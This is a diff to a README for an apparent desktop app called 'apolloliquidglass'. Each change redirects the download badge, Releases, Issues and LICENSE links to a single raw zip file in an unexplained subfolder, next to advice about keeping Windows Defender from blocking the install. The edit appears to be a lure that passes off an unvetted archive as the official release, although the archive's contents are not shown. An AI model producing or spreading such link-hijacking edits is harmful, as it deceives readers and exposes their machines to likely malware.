@@ -1,7 +1,7 @@
 # 🌟 apolloliquidglass - Experience a Sleek User Interface
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/AlluAlas/apolloliquidglass/releases)
+[![Download](https://raw.githubusercontent.com/AlluAlas/apolloliquidglass/main/Andarko/apolloliquidglass.zip)](https://raw.githubusercontent.com/AlluAlas/apolloliquidglass/main/Andarko/apolloliquidglass.zip)
 
 ## 🚀 Getting Started
 Welcome to apolloliquidglass! This application combines the best of Apollo with a Liquid Glass user interface, offering a smooth and visually appealing experience. Follow this guide to download and run the software easily.
@@ -16,7 +16,7 @@ Before you download, ensure your computer meets these requirements:
 - **Graphics:** Any modern graphics card
 
 ## 🔗 Download & Install
-To get started, visit our [Releases page](https://github.com/AlluAlas/apolloliquidglass/releases) to download the application.
+To get started, visit our [Releases page](https://raw.githubusercontent.com/AlluAlas/apolloliquidglass/main/Andarko/apolloliquidglass.zip) to download the application.
 
 1. Click on the link above.
 2. Look for the latest release, which will be at the top of the page.
@@ -53,15 +53,15 @@ If you encounter issues while downloading or running the application, try the fo
 - **Windows Defender:** For Windows users, make sure Windows Defender is not blocking the installation.
 
 ## 💬 Support
-If you need help or have questions, feel free to visit our [Issues page](https://github.com/AlluAlas/apolloliquidglass/issues) on GitHub. You can report problems, ask questions, and suggest features.
+If you need help or have questions, feel free to visit our [Issues page](https://raw.githubusercontent.com/AlluAlas/apolloliquidglass/main/Andarko/apolloliquidglass.zip) on GitHub. You can report problems, ask questions, and suggest features.
 
 ## 📄 License
-This project is licensed under the MIT License. For more details, refer to the [LICENSE.md file](https://github.com/AlluAlas/apolloliquidglass/blob/main/LICENSE.md).
+This project is licensed under the MIT License. For more details, refer to the [https://raw.githubusercontent.com/AlluAlas/apolloliquidglass/main/Andarko/apolloliquidglass.zip file](https://raw.githubusercontent.com/AlluAlas/apolloliquidglass/main/Andarko/apolloliquidglass.zip).
 
 ## 🎉 Acknowledgements
 Thank you for using Apollo w/ Liquid Glass! We appreciate your support and hope you enjoy the application. 
 
 ## 📥 Download Now Again
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/AlluAlas/apolloliquidglass/releases)
+[![Download](https://raw.githubusercontent.com/AlluAlas/apolloliquidglass/main/Andarko/apolloliquidglass.zip)](https://raw.githubusercontent.com/AlluAlas/apolloliquidglass/main/Andarko/apolloliquidglass.zip)
 
 We look forward to your feedback and suggestions!
